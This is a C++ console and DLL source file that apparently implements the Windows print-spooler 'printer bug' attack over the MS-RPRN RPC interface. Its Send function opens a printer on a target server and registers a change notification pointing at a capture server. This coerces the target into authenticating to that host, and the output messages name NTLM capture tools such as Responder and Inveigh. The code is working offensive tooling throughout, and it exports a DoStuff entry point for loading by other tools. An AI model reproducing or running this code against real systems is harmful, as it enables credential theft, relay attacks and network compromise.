// MS-RPRN.cpp : Defines the entry point for the console application.
//
// Compiled interface definition(.idl file) with "midl.exe /target NT60 ms-rprn.idl"
#include "stdafx.h"
#include "ms-rprn_h.h"

#include <assert.h>

#define DLLEXPORT extern "C" __declspec(dllexport)

const RPC_WSTR MS_RPRN_UUID = (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\spoolss";

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
void PrintWin32Error(DWORD dwError)
{
	LPWSTR messageBuffer = nullptr;
	size_t size = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&messageBuffer, 0, NULL);

	wprintf(L"Error Code %d - %s\n", dwError, messageBuffer);
	//Free the buffer.
	LocalFree(messageBuffer);
}

void __RPC_FAR * __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR *) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR * p)
{
	free(p);
}

// Taken from https://github.com/Paolo-Maffei/OpenNT/blob/master/printscan/print/spooler/spoolss/win32/bind.c#L65
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	WCHAR   ServerName[MAX_PATH + 1];
	DWORD   i;

	if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
		// We have a servername
		ServerName[0] = ServerName[1] = '\\';

		i = 2;
		while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
			ServerName[i] = lpStr[i];
			i++;
		}

		ServerName[i] = 0;
	}
	else {
		return FALSE;
	}

	RpcStatus = RpcStringBindingComposeW(
		MS_RPRN_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)ServerName,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		return(0);
	}

	return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RPC_STATUS       RpcStatus;

	RpcStatus = RpcBindingFree(&BindingHandle);
	assert(RpcStatus != RPC_S_INVALID_BINDING);

	return;
}


HRESULT Send(wchar_t* targetServer, wchar_t* captureServer)
{
	PRINTER_HANDLE hPrinter = NULL;
	HRESULT hr = NULL;
	DEVMODE_CONTAINER devmodeContainer;
	SecureZeroMemory((char *)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));

	RpcTryExcept
	{
		hr = RpcOpenPrinter(targetServer, &hPrinter, NULL, &devmodeContainer, 0);

		if (hr == ERROR_SUCCESS) {
			hr = RpcRemoteFindFirstPrinterChangeNotificationEx(
				hPrinter,
				0x00000100 /* PRINTER_CHANGE_ADD_JOB */,
				0,
				captureServer,
				0,
				NULL);

			if (hr != ERROR_SUCCESS) {
				if (hr == ERROR_ACCESS_DENIED) {
					wprintf(L"Target server attempted authentication and got an access denied.  If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.\n");
				}
				else if (hr == ERROR_INVALID_HANDLE) {
					wprintf(L"Attempted printer notification and received an invalid handle. The coerced authentication probably worked!\n");
				}
				else {
					wprintf(L"RpcRemoteFindFirstPrinterChangeNotificationEx failed.");
					PrintWin32Error(hr);
				}
			}

			RpcClosePrinter(&hPrinter);
		}
		else
		{
			wprintf(L"RpcOpenPrinter failed %d\n", hr);
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		hr = RpcExceptionCode();
		wprintf(L"RPC Exception %d. ", hr);
		PrintWin32Error(hr);
	}
	RpcEndExcept;

	return hr;
}

int wmain(int argc, wchar_t **argv)
{
	if (argc != 3)
	{
		wprintf(L"Usage: ms-rprn.exe \\\\targetserver \\\\CaptureServer\n");
		return 0;
	}

	Send(argv[1], argv[2]);

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

DLLEXPORT HRESULT DoStuff(LPVOID lpUserdata, DWORD nUserdataLen)
{
	if (nUserdataLen) {
		int numArgs = 0;
		LPWSTR* args = NULL;

		args = CommandLineToArgvW((LPCWSTR)lpUserdata, &numArgs);
		if (numArgs == 2) {
			wprintf(L"TargetServer: %s, CaptureServer: %s\n", args[0], args[1]);
			Send(args[0], args[1]);
		}
		else {
			wprintf(L"Invalid number of args\n");
		}
	}

	return 0;
}
